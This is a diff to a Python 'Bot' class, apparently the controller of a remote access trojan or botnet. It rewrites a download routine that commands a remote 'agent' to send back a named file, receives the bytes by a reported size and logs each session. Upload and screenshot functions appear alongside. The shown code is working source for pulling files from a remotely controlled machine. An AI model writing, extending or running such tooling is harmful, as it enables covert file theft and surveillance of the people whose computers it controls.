@@ -117,29 +117,57 @@ class Bot:
             logging.error(f"Upload error - Session {self.id} | Error: {e}")
             return False, f"Upload error: {str(e)}"
 
-    def download_file(self, file_name):
+    def download_file(self, filename):
         try:
-            f = open(file_name, 'wb')
-        except IOError as e:
-            return f"Error opening file {file_name} for writing: {e}"
+            # Send download command
+            command = {
+                'command': 'download',
+                'filename': filename
+            }
+            if not self.reliable_send(command):
+                return False, "Failed to send download command", None
+
+            # Get file size response
+            response = self.reliable_recv()
+            if not response:
+                return False, "No response from agent", None
             
-        self.target.settimeout(2)
-        chunk = None
-        try:
-            while True:
-                try:
-                    if chunk is not None:
-                        f.write(chunk)
-                    chunk = self.target.recv(1024)
-                except socket.timeout:
-                    break
-        except socket.error as e:
-            f.close()
-            return f"Error receiving data: {e}"
-        finally:
-            f.close()
-        self.target.settimeout(None)
-        return f"File {file_name} downloaded successfully."
+            if response.get('error'):
+                return False, response['error'], None
+            
+            try:
+                file_size = int(response.get('size', 0))
+                if file_size == 0:
+                    return False, "Empty file size received", None
+            except (ValueError, TypeError):
+                return False, "Invalid file size received", None
+
+            # Receive file data
+            received_data = b''
+            remaining = file_size
+            
+            try:
+                while remaining > 0:
+                    chunk = self.target.recv(min(4096, remaining))
+                    if not chunk:
+                        break
+                    received_data += chunk
+                    remaining -= len(chunk)
+                
+                if len(received_data) == file_size:
+                    logging.info(f"File download completed - Session {self.id} | File: {filename}")
+                    return True, f"File {filename} downloaded successfully", received_data
+                else:
+                    logging.error(f"Download incomplete - Session {self.id} | File: {filename}")
+                    return False, "Download incomplete", None
+                
+            except Exception as e:
+                logging.error(f"Error receiving file data - Session {self.id} | Error: {e}")
+                return False, f"Error receiving file data: {str(e)}", None
+            
+        except Exception as e:
+            logging.error(f"Download error - Session {self.id} | Error: {e}")
+            return False, f"Download error: {str(e)}", None
 
     def screenshot(self):
         os.makedirs(SCREENSHOT_DIR, exist_ok=True)
